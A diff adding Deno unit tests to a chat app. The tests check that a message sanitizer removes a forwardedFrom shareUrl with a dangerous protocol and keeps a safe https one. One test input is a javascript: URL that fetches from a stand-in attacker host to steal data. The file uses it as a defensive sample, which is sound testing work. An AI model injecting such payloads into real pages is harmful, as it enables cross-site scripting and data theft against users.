@@ -19,6 +19,36 @@ import {
 	wrapProtocolHttpsUrl,
 } from '../../public/shared/runUri.mjs'
 
+Deno.test('sanitizeForwardedFrom rejects dangerous shareUrl protocols', () => {
+	const eventId = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'
+	const base = { groupId: 'g1', channelId: 'default', eventId }
+	const out = sanitizeMessageExtras({
+		content: 'hi',
+		extension: {
+			chat: {
+				forwardedFrom: { ...base, shareUrl: 'javascript:fetch("//attacker.example/steal")' },
+			},
+		},
+	})
+	// 危险协议被丢弃，其余字段保留（渲染端不会出现 `javascript:` href）
+	assertEquals(out.extension?.chat?.forwardedFrom?.shareUrl, undefined)
+	assertEquals(out.extension?.chat?.forwardedFrom?.groupId, 'g1')
+})
+
+Deno.test('sanitizeForwardedFrom keeps safe shareUrl', () => {
+	const eventId = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'
+	const shareUrl = 'https://steve02081504.github.io/fount/protocol?url=https%3A%2F%2Fexample.com%2Fp'
+	const out = sanitizeMessageExtras({
+		content: 'hi',
+		extension: {
+			chat: {
+				forwardedFrom: { groupId: 'g1', channelId: 'default', eventId, shareUrl },
+			},
+		},
+	})
+	assertEquals(out.extension?.chat?.forwardedFrom?.shareUrl, shareUrl)
+})
+
 Deno.test('sanitizeLocale / content_warning / alt truncate', () => {
 	assertEquals(sanitizeLocale('  zh-CN  '), 'zh-CN')
 	assertEquals(sanitizeContentWarning('x'.repeat(300))?.length, 200)
